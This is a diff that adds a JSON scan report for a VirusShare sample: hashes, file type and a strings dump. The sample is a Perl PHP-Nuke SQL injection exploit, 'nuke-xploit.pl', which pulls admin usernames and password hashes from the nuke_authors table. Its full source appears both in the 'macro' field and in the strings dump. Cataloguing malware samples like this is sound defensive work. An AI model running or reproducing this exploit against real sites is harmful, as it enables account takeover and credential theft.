@@ -1,0 +1,88 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "User-Agent": "May download files from the Internet"
+        },
+        "macro": "#!/usr/bin/perl -w\nuse IO::Socket;\n\n\nif (@ARGV < 3)\n{\nprint \"################################################################\\n\";\nprint \" nuke-xploit.pl - PHP-NUKE 'CiD' sql injection exploit\\n\";\nprint \" Origional by RUSH / tweaked by IceNix\\n\";\nprint \" -----------------------------------------------------\\n\";\nprint \"################################################################\\n\";\nprint \" Usage:\\n\";\nprint \" nuke-xploit.pl <host> </folder/> <aid>\\n\";\nprint \"\\n\";\nprint \" <host> - webserver you want to r00t\\n\";\nprint \" </folder/> - PHP-nuke folder ( /phpnuke/ , /nuke/ or / for no folder )\\n\";\nprint \" <aid> - user aid , nick ( admin , god , root , whateva )\\n\";\nprint \" ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\\n\";\nprint \" REQUIREMENTS:                                                 \\n\";\nprint \" (*) Only works on MySQL Version > 4.0\\n\";\nprint \" (*) You need to know the Admins User-Name\\n\";\nprint \" (*) Please dont be an abuser\\n\";\nprint \"##################################################################\";\nexit();\n}\n\n$server = $ARGV[0];\n$folder = $ARGV[1];\n$aid = $ARGV[2];\n\nprint \"\\n\";\nprint \"server : $server\\n\";\nprint \"folder : $folder\\n\";\nprint \"aid : $aid\\n\";\nprint \"\\n\";\n$success = 0;\n$path_download = \"modules.php?name=Downloads&d_op=viewdownload&cid=2%20UNION%20select%20counter,%20aid,%20pwd%20FROM%20nuke_authors%20--\";\n$GET = $folder . $path_download;\nprint \"[~] Prepare to connect...\\n\";\n$socket = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$server\", PeerPort => \"80\") || die \"[-] connect failed\\n\";\nprint \"[+] connected [exists]\\n\";\nprint \"[~] prepare to send data...[sending exploit]\\n\";\nprint $socket \"GET $GET HTTP/1.1\\n\";\nprint $socket \"Host: $server\\n\";\nprint $socket \"Accept: */*\\n\";\nprint $socket \"Http-Referer: http://microsoft.com\\n\";\nprint $socket \"User-Agent: Internet Explorer 6.0\\n\";\nprint $socket \"Pragma: no-cache\\n\";\nprint $socket \"Cache-Control: no-cache\\n\";\nprint $socket \"Connection: close\\n\\n\";\nprint \"[+] success...[wo0t .. exploit sent]\\n\";\nprint \"[~] wait for reply...[cross your fingers]\\n\";\nwhile ($answer = <$socket>)\n{\n#print \"$answer\";\nif ($answer=~/(&cid=)(\\w)(\\\"><b>)($aid)(<\\/b><\\/a><\\/font>)(.{0,20})(<font class=\\\"content\\\">)(.{32})(<\\/font>)/)\n{\n$success = 1;\nprint \"[+] wo0t..Pay Tribute to IceNix\\n\";\nprint \"[+] USER: $1 \\n[+] MD5 HASH: $6\\n\";\n}\n}\nif ($success == 0) { print \"[-] the exploit failed...possible reasons: [Not MySQL Version 4.0]\\n\"; }\n"
+    },
+    "filename": "VirusShare_78f464eb008799f89429c4a1015d9682",
+    "filesize": 2507,
+    "filetype": "Perl script text executable",
+    "hashes": {
+        "md5": "78f464eb008799f89429c4a1015d9682",
+        "sha1": "e385cb7279734790b1dcc62c925f45c88ac1ed69",
+        "sha256": "effc0e4222a4ce1588dd5e8b8445234970ab81de43bf86523a0a9168c460b355"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/usr/bin/perl -w",
+            "use IO::Socket;",
+            "if (@ARGV < 3)",
+            "print \"################################################################\\n\";",
+            "print \" nuke-xploit.pl - PHP-NUKE 'CiD' sql injection exploit\\n\";",
+            "print \" Origional by RUSH / tweaked by IceNix\\n\";",
+            "print \" -----------------------------------------------------\\n\";",
+            "print \"################################################################\\n\";",
+            "print \" Usage:\\n\";",
+            "print \" nuke-xploit.pl <host> </folder/> <aid>\\n\";",
+            "print \"\\n\";",
+            "print \" <host> - webserver you want to r00t\\n\";",
+            "print \" </folder/> - PHP-nuke folder ( /phpnuke/ , /nuke/ or / for no folder )\\n\";",
+            "print \" <aid> - user aid , nick ( admin , god , root , whateva )\\n\";",
+            "print \" ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\\n\";",
+            "print \" REQUIREMENTS:                                                 \\n\";",
+            "print \" (*) Only works on MySQL Version > 4.0\\n\";",
+            "print \" (*) You need to know the Admins User-Name\\n\";",
+            "print \" (*) Please dont be an abuser\\n\";",
+            "print \"##################################################################\";",
+            "exit();",
+            "$server = $ARGV[0];",
+            "$folder = $ARGV[1];",
+            "$aid = $ARGV[2];",
+            "print \"\\n\";",
+            "print \"server : $server\\n\";",
+            "print \"folder : $folder\\n\";",
+            "print \"aid : $aid\\n\";",
+            "print \"\\n\";",
+            "$success = 0;",
+            "$path_download = \"modules.php?name=Downloads&d_op=viewdownload&cid=2%20UNION%20select%20counter,%20aid,%20pwd%20FROM%20nuke_authors%20--\";",
+            "$GET = $folder . $path_download;",
+            "print \"[~] Prepare to connect...\\n\";",
+            "$socket = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$server\", PeerPort => \"80\") || die \"[-] connect failed\\n\";",
+            "print \"[+] connected [exists]\\n\";",
+            "print \"[~] prepare to send data...[sending exploit]\\n\";",
+            "print $socket \"GET $GET HTTP/1.1\\n\";",
+            "print $socket \"Host: $server\\n\";",
+            "print $socket \"Accept: */*\\n\";",
+            "print $socket \"Http-Referer: http://microsoft.com\\n\";",
+            "print $socket \"User-Agent: Internet Explorer 6.0\\n\";",
+            "print $socket \"Pragma: no-cache\\n\";",
+            "print $socket \"Cache-Control: no-cache\\n\";",
+            "print $socket \"Connection: close\\n\\n\";",
+            "print \"[+] success...[wo0t .. exploit sent]\\n\";",
+            "print \"[~] wait for reply...[cross your fingers]\\n\";",
+            "while ($answer = <$socket>)",
+            "#print \"$answer\";",
+            "if ($answer=~/(&cid=)(\\w)(\\\"><b>)($aid)(<\\/b><\\/a><\\/font>)(.{0,20})(<font class=\\\"content\\\">)(.{32})(<\\/font>)/)",
+            "$success = 1;",
+            "print \"[+] wo0t..Pay Tribute to IceNix\\n\";",
+            "print \"[+] USER: $1 \\n[+] MD5 HASH: $6\\n\";",
+            "if ($success == 0) { print \"[-] the exploit failed...possible reasons: [Not MySQL Version 4.0]\\n\"; }"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://microsoft.com\\n"
+        ]
+    },
+    "time": "0:00:00.289501",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
